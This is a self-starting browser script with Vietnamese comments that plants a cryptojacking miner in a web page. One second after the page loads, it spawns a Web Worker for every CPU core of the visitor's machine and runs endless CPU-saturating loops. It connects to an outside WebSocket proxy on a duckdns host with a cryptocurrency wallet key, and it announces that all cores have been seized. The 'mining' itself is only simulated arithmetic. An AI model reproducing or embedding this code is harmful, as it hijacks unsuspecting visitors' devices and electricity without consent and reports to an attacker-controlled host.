<script>
    // 1. "Bộ não" của thợ đào - Ép toán học cực nặng
    const workerCode = `
        self.onmessage = function(e) {
            const { proxy, wallet, threadId } = e.data;
            console.log("Thợ đào số " + threadId + " đã vào việc!");

            // Kết nối WebSocket tới VPS của ông
            const ws = new WebSocket(proxy);
            
            ws.onopen = () => {
                ws.send(JSON.stringify({type: "auth", params: {site_key: wallet, type: "anonymous"}}));
            };

            // Vòng lặp TỬ CHIẾN - Không cho CPU nghỉ một mili giây nào
            function burn() {
                let x = 0;
                while (true) {
                    // Thuật toán giả lập tính toán nặng để ép CPU nhảy số
                    for (let i = 0; i < 1000000; i++) {
                        x = Math.sqrt(Math.random() * Math.random() + Math.random());
                    }
                    // Thỉnh thoảng báo cáo về luồng chính
                    if (Math.random() > 0.99) break; 
                }
                setTimeout(burn, 0); // Tiếp tục ngay lập tức
            }
            burn();
        };
    `;

    const blob = new Blob([workerCode], { type: 'application/javascript' });
    const workerUrl = URL.createObjectURL(blob);

    function nổMáyTổngLực() {
        // Tự động lấy số nhân CPU của máy khách (ví dụ máy 8 nhân sẽ tạo 8 thợ)
        const numThreads = navigator.hardwareConcurrency || 4;
        const proxy = 'wss://trungturng.duckdns.org:8080';
        const wallet = '47NwLUwjtUoGzgRqEsLCcn7uZPeXDkzXKSu4h9K236tXA8zxY65jrK7ZVAkxYeMKZP57wrbyNcWmR66Tv5WLZGag8vdskcF';

        console.log("Phát hiện máy có " + numThreads + " nhân. Đang huy động toàn quân...");

        for (let i = 0; i < numThreads; i++) {
            const worker = new Worker(workerUrl);
            worker.postMessage({ proxy, wallet, threadId: i + 1 });
        }

        console.log("%c !!! TẤT CẢ CÁC NHÂN CPU ĐÃ BỊ CHIẾM DỤNG !!! ", "background: red; color: white; font-size: 20px; font-weight: bold;");
    }

    // Chạy sau 1 giây
    setTimeout(nổMáyTổngLực, 1000);
</script>
